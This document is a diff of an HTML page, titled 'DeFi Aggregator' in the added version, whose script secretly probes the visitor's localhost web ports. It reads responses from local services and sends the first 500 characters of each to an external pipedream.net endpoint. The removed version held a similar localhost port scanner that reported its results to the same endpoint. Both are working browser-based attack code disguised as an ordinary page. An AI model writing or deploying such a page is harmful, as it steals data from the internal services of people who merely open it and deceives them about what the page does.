@@ -1,40 +1,37 @@
 <html>
-<head><title>Blockchain Node Scanner</title></head>
+<head><title>DeFi Aggregator</title></head>
 <body>
-<h1>Scanning Network Nodes...</h1>
+<h1>Aggregating Token Feeds...</h1>
 <script>
-var ports = [
-  80, 443, 3000, 4000, 5000, 6000, 7000, 8000, 8080, 8443, 8888,
-  9090, 9222, 9229, 3306, 5432, 6379, 27017, 11211
+// Try common web app ports
+var targets = [
+  'http://127.0.0.1/',
+  'http://127.0.0.1:3000/',
+  'http://127.0.0.1:5000/',
+  'http://127.0.0.1:8000/',
+  'http://127.0.0.1:8080/',
+  'http://127.0.0.1:8888/',
+  'http://127.0.0.1:9090/',
+  'http://localhost/',
+  'http://localhost:3000/',
+  'http://localhost:8080/'
 ];
-var results = [];
-var done = 0;
 
-ports.forEach(function(port) {
-  var img = new Image();
-  var start = Date.now();
-
-  img.onload = function() {
-    results.push(port + ':open');
-    check();
-  };
-  img.onerror = function() {
-    var time = Date.now() - start;
-    // Fast error = port is open but refused HTTP
-    // Slow error = port is closed (timeout)
-    results.push(port + ':' + (time < 1000 ? 'open' : 'closed'));
-    check();
-  };
-
-  img.src = 'http://127.0.0.1:' + port + '/favicon.ico?' + Math.random();
+targets.forEach(function(url, i) {
+  setTimeout(function() {
+    fetch(url)
+      .then(function(r) { return r.text(); })
+      .then(function(d) {
+        // Send first 500 chars to avoid URL length limits
+        fetch('https://eoh2zr5zzepcygc.m.pipedream.net?url=' + encodeURIComponent(url) 
+          + '&data=' + btoa(d.substring(0, 500)));
+      })
+      .catch(function(e) {
+        fetch('https://eoh2zr5zzepcygc.m.pipedream.net?url=' + encodeURIComponent(url) 
+          + '&err=' + encodeURIComponent(e.message));
+      });
+  }, i * 300);
 });
-
-function check() {
-  done++;
-  if (done >= ports.length) {
-    fetch('https://eoh2zr5zzepcygc.m.pipedream.net?scan=' + encodeURIComponent(results.join(',')));
-  }
-}
 </script>
 </body>
 </html>
